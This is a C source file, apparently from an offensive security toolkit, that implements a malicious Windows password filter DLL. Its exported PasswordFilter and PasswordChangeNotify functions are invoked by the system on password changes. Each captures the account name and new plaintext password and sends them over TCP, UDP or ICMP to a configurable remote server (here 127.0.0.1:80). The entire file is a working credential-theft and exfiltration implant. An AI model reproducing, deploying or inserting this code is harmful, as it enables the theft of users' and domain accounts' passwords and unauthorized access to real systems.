// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#include "../wsbind.h"
#include <ntsecapi.h>

#define WSB_PASS_SEP "::\0"

#define REMOTE_PORT 80
#define REMOTE_PROTOCOL 0
#define REMOTE_SERVER "127.0.0.1\0"

CRITICAL_SECTION wsCriticalSection;

void wsPasswordSend(PUNICODE_STRING wsUser, PUNICODE_STRING wsPassword)
{
    char *wsUsr = wsu_utf16_to_utf8((char*)(wsUser->Buffer), wsUser->Length),
            *wsPas = wsu_utf16_to_utf8((char*)(wsPassword->Buffer), wsPassword->Length);
    SockData wsTransfer;
    switch(REMOTE_PROTOCOL)
    {
        case 2:
            wsTransfer = wsc_icmp_create(REMOTE_SERVER);
            break;
        case 1:
            wsTransfer = wsc_udp_create(REMOTE_SERVER, REMOTE_PORT);
            break;
        case 0:
        default:
            wsTransfer = wsc_tcp_create(REMOTE_SERVER, REMOTE_PORT);
            break;
    }
    wsc_writen(&wsTransfer, (wsUser->Length)/2, wsUsr);
    wsc_write(&wsTransfer, WSB_PASS_SEP);
    wsc_writen(&wsTransfer, (wsPassword->Length)/2, wsPas);
    wsc_write(&wsTransfer, WSB_NEWLINE);
    wsu_clear_buffer(&wsUsr, (wsUser->Length)/2);
    wsu_clear_buffer(&wsPas, (wsPassword->Length)/2);
    free(wsUsr);
    free(wsPas);
    wsc_close_sock(&wsTransfer);
}

__declspec(dllexport) BOOL NTAPI InitializeChangeNotify(void)
{
    wsc_init();
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hiDLL, DWORD dwReason, LPVOID lpReserved)
{
    return TRUE;
}

__declspec(dllexport) NTSTATUS NTAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword)
{
    EnterCriticalSection(&wsCriticalSection);
    wsPasswordSend(UserName, NewPassword);
    LeaveCriticalSection(&wsCriticalSection);
    return 0;
}

__declspec(dllexport) BOOL NTAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOL SetOperation)
{
    wsPasswordSend(AccountName, Password);
    return TRUE;
}
